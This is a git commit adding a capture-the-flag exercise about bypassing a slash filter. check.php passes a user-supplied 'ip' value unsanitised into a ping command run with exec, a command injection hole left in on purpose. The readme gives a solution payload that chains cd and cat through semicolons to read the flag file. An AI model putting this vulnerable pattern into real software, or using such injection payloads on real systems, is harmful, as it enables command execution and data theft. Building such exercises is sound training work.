33cfd816f7d4badf456d5bbec9e3da8967a2ec56
LPLaser <mlzxgzy@gmail.com>
2021-10-06 12:56:11 +0800

    添加了第三题

---
+++ 3.过滤斜杠/check.php
@@ -0,0 +1,19 @@
+<?php
+header("Content-type: text/html; charset=utf-8");
+show_source(__FILE__);
+$res = FALSE;
+
+if (isset($_GET['ip']) && $_GET['ip']) {
+    $ip = $_GET['ip'];
+    $m = [];
+    if (!preg_match_all("/\//", $ip, $m)) {
+        $cmd = "ping -c 4 {$ip}";
+        exec($cmd, $res);
+    } else {
+        $res = $m;
+    }
+}
+if ($res) {
+    print_r($res);
+}
+?>
---
+++ 3.过滤斜杠/readme.md
@@ -0,0 +1,19 @@
+# 结构
+
+```
+./
+|
+--- index.php
+--- check.php
+--- flag_is_here
+  |
+  --- flag_11255342654.php   <--- flag is here
+```
+
+
+
+# 解法
+
+可以先cd到指定目录然后再ls
+
+e.g. check.php?ip=;cd%20flag_is_here;cat%20flag_187841542210631.php
